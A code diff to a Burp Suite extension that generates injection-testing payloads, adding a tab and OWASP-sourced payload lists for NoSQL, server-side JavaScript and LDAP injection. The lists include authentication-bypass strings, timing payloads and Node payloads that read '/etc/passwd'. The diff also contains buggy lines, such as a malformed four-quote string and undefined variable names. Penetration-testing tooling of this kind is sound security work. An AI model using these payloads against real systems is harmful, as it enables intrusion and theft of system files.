@@ -1,9 +1,9 @@
 __author__ = 'Jake Miller (@LaconicWolf)'
-__date__ = '20190320'
-__version__ = '0.01'
-__description__ = """\
+__date__ = '20190404'
+__version__ = '0.02'
+__description__ = """"\
 Burp Extension that generates payloads for 
-XSS, SQLi, and Header injection vulns.
+XSS, SQLi, Header injection, and a few other vulns.
 """
 
 from burp import IBurpExtender, ITab
@@ -126,6 +126,25 @@ headersConfig = {
     "URL encode special chars": False,
     "Non-standard percent encoding": False,
     "Non-standard slash encoding": False
+}
+
+otherVulnsToTest = {
+    'NoSQLi': False,
+    'LDAP Injection': False, 
+    'JavaScript Injection': False,
+    'General Fuzzing': False,  
+}
+
+otherVulnsConfig = {
+    "URL encode special chars": False,
+    "Replace () with ``": False,
+    "Toggle case": False,
+    "Upper case": False,
+    "HTML encode special chars": False,
+    "Prepend random chars": False,
+    "Non-standard percent encoding": False,
+    "Non-standard slash encoding": False,
+    "Close tags": False
 }
 
 # Interact with Burp. Required
@@ -511,6 +530,87 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
         thirdTab.add(tmpGridPanel, BorderLayout.SOUTH)
         ############ END HEADERS TAB ############
 
+        ############ START OTHER TAB ############ 
+        otherTab = swing.JPanel()
+        otherTab.layout = BorderLayout()
+        tabbedPane.addTab("Other", otherTab)
+
+        # Top of Headers Panel
+        tmpPanel = swing.JPanel()
+        tmpPanel.layout = GridLayout(3, 5)
+        tmpPanel.border = swing.BorderFactory.createTitledBorder("Vulnerabilities")
+        
+        # First row
+        tmpPanel.add(swing.JCheckBox("NoSQLi", False, actionPerformed=self.handleOtherSelectCheckBox))
+        tmpPanel.add(swing.JLabel(""))
+        tmpPanel.add(swing.JLabel(""))
+        
+        # Will add more payloads in future releases
+
+        # Second row
+        tmpPanel.add(swing.JCheckBox("JavaScript Injection", False, actionPerformed=self.handleOtherSelectCheckBox))
+        tmpPanel.add(swing.JLabel(""))
+        tmpPanel.add(swing.JLabel(""))
+        
+        # Third row
+        tmpPanel.add(swing.JCheckBox("LDAP Injection", False, actionPerformed=self.handleOtherSelectCheckBox))
+        tmpPanel.add(swing.JLabel(""))
+        tmpPanel.add(swing.JLabel(""))
+        
+        otherTab.add(tmpPanel, BorderLayout.NORTH)
+
+        # Middle of Headers Panel
+        tmpPanel = swing.JPanel()
+        tmpPanel.layout = BorderLayout()
+        tmpPanel.border = swing.BorderFactory.createTitledBorder("Payloads")
+        self.otherPayloadTextArea = swing.JTextArea('', 15, 100)
+        self.otherPayloadTextArea.setLineWrap(False)
+        scrollTextArea = swing.JScrollPane(self.otherPayloadTextArea)
+        tmpPanel.add(scrollTextArea)
+        otherTab.add(tmpPanel, BorderLayout.CENTER)
+
+        # Right/Middle of XSS Panel
+        tmpPanel = swing.JPanel()
+        tmpPanel.layout = GridLayout(6,1)
+        tmpPanel.border = swing.BorderFactory.createTitledBorder("Output options")
+        tmpPanel.add(swing.JButton('Generate Payloads', actionPerformed=self.handleOtherButtonClick))
+        tmpPanel.add(swing.JButton('Copy Payloads to Clipboard', actionPerformed=self.handleOtherButtonClick))
+        tmpPanel.add(swing.JButton('Clear Payloads', actionPerformed=self.handleOtherButtonClick))
+        tmpPanel.add(swing.JButton('Save to File', actionPerformed=self.handleOtherButtonClick))
+        tmpPanel.add(swing.JLabel(""))
+        tmpPanel.add(swing.JLabel(""))
+        otherTab.add(tmpPanel, BorderLayout.EAST)
+
+        # Bottom of XSS Panel
+        tmpPanel = swing.JPanel()
+        tmpPanel.layout = GridLayout(3, 5)
+        tmpPanel.border = swing.BorderFactory.createTitledBorder("Config")
+
+        # First row
+        tmpPanel.add(swing.JCheckBox("Upper case", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JCheckBox("Prepend random chars", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JCheckBox("HTML encode special chars", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JLabel("Add a prefix :     ", swing.SwingConstants.RIGHT))
+        self.otherPrefixArea = swing.JTextField('', 15)
+        tmpPanel.add(self.otherPrefixArea)
+        
+        # Second row
+        tmpPanel.add(swing.JCheckBox("URL encode special chars", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JCheckBox("Toggle case", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JLabel(""))
+        tmpPanel.add(swing.JLabel("Add a suffix :     ", swing.SwingConstants.RIGHT))
+        self.otherSuffixArea = swing.JTextField("", 15)
+        tmpPanel.add(self.otherSuffixArea)
+
+        # Third row
+        tmpPanel.add(swing.JCheckBox("Non-standard percent encoding", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JCheckBox("Non-standard slash encoding", False, actionPerformed=self.handleOtherConfigCheckBox))
+        tmpPanel.add(swing.JLabel(""))
+        tmpPanel.add(swing.JLabel(""))
+        
+        otherTab.add(tmpPanel, BorderLayout.SOUTH)
+        ############ END OTHER TAB ############
+
         ### Originally had 7 tabs...Got rid of 4, 5, and 6. ###
 
         callbacks.addSuiteTab(self)
@@ -854,6 +954,89 @@ class BurpExtender(IBurpExtender, ITab, swing.JFrame):
 
         self.headerPayloadTextArea.text = '\n'.join(payloads)
 
+    def handleOtherSelectCheckBox(self, event):
+        """Handles checkbox clicks from the Headers menu 
+        header selection to ensure only payloads for 
+        specified headers are generated.
+        """
+        if event.source.selected:
+            otherVulnsToTest[event.source.text] = True
+        else:
+            otherVulnsToTest[event.source.text] = False
+
+    def handleOtherConfigCheckBox(self, event):
+        """Handles checkbox clicks from the Other's menu config 
+        selection to ensure only payloads are generated with 
+        or without any specified options.
+        """
+        if event.source.selected:
+            otherVulnsConfig[event.source.text] = True
+        else:
+            otherVulnsConfig[event.source.text] = False
+
+    def handleOtherTestsCheckBox(self, event):
+        """Handles checkbox clicks from the Other tab Tests 
+        selection to ensure only payloads are generated with 
+        or without any specified options.
+        """
+        if event.source.selected:
+            otherVulnsTests[event.source.text] = True
+        else:
+            otherVulns[event.source.text] = False
+
+    def handleOtherButtonClick(self, event):
+        """Handles button clicks from Other menu."""
+        buttonText = event.source.text
+        if buttonText == "Generate Payloads":
+            self.launchThread(self.generateOtherPayloads())
+        elif buttonText == "Copy Payloads to Clipboard":
+            self.copyToClipboard(self.otherPayloadTextArea.text)
+        elif buttonText == 'Clear Payloads':
+            self.clearTextArea(self.otherPayloadTextArea)
+        elif buttonText == "Poll Collaborator Server":
+            self.launchThread(self.pollCollabServer())            
+        elif buttonText == "Save to File":
+            self.launchThread(self.saveTextToFile, [self.otherPayloadTextArea])
+        else:
+            print buttonText
+
+    def generateOtherPayloads(self):
+        """Write payloads to the text area"""
+        payloads = []
+        vulns = [vuln for vuln in otherVulnsToTest if otherVulnsToTest[vuln]]
+        
+        for vuln in vulns:
+            if vuln == "NoSQLi":
+                noSqliPayloads = NOSQLI_PAYLOADS.split('\n')
+                payloads += noSqliPayloads
+            if vuln == "JavaScript Injection":
+                    jSPayloads = JAVASCRIPT_INJECTION_PAYLOADS.split('\n')
+                    payloads += jSPayloads
+            if vuln == "LDAP Injection":
+                    ldapPayloads = LDAP_INJECTION_PAYLOADS.split('\n')
+                    payloads += ldapPayloads
+
+        if self.otherPrefixArea.text:
+            payloads = [self.otherPrefixArea.text + payload for payload in payloads]
+        if self.otherSuffixArea.text:
+            payloads = [payload + self.otherSuffixArea.text for payload in payloads]
+        if otherVulnsConfig['Upper case']:
+            payloads = [payload.upper() for payload in payloads]
+        if otherVulnsConfig['Toggle case']:
+            payloads = [capsEveryOtherChar(payload) for payload in payloads]
+        if otherVulnsConfig['Prepend random chars']:
+            payloads = [getRandomString(5) + payload for payload in payloads]
+        if otherVulnsConfig['Non-standard percent encoding']:
+            payloads = [percentNonStandardEncode(payload) for payload in payloads]
+        if otherVulnsConfig['Non-standard slash encoding']:
+            payloads = [slashNonStandardEncode(payload) for payload in payloads]
+        if otherVulnsConfig['URL encode special chars']:
+            payloads = [urlEncode(payload) for payload in payloads]
+        if otherVulnsConfig['HTML encode special chars']:
+            payloads = [cgi.escape(payload) for payload in payloads]
+
+        self.otherPayloadTextArea.text = '\n'.join(payloads)
+
     def copyToClipboard(self, text):
         """Copies text to clipboard"""
         toolkit = Toolkit.getDefaultToolkit()
@@ -962,6 +1145,96 @@ def getSqlMapPayloads():
             print line
             continue
     return sorted(payload_data, key=lambda x: x[0])
+
+# Sourced from references located at https://www.owasp.org/index.php/Testing_for_NoSQL_injection
+NOSQLI_PAYLOADS = """\
+'
+"
+\\
+;
+{   
+}
+NaN
+==isNaN
+';return(true);var foo='bar
+';return(false);var foo='bar
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+{$gt: ''}
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+|| '1'=='1
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+';sleep(5000);
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+';return(db.getCollectionNames().length == 1);
+';return(db.getCollectionNames().length == 2);
+[$ne]=1
+[$gt]
+[$ne]
+[$in][]
+[$regex]=.*
+"""
+
+# Sourced from references located at https://www.owasp.org/index.php/Testing_for_NoSQL_injection
+JAVASCRIPT_INJECTION_PAYLOADS = """\
+'
+"
+\\
+;
+{   
+}
+NaN
+==isNaN
+|| 1==1
+|| '1'=='1
+response.end('success')
+response.end(require('fs').readdirSync('.').toString())
+response.end(require('fs').readFileSync('/etc/passwd'))
+"""
+
+LDAP_INJECTION_PAYLOADS = """\
+(
+)
+|
+&
+*
+)(&))
+)(*)
+!
+*/*
+*|
+/
+//
+//*
+@*
+%21
+%26
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+*(|(mail=*))
+*(|(objectclass=*))
+x' or name()='username' or 'x'='y
+*()|&'
+admin*
+admin*)((|userpassword=*)
+*)(uid=*))(|(uid=*
+*()|%26'
+"""
 
 # Data pulled from SqlMap XML files 3/14/2019
 SQLMAP_DATA = """\
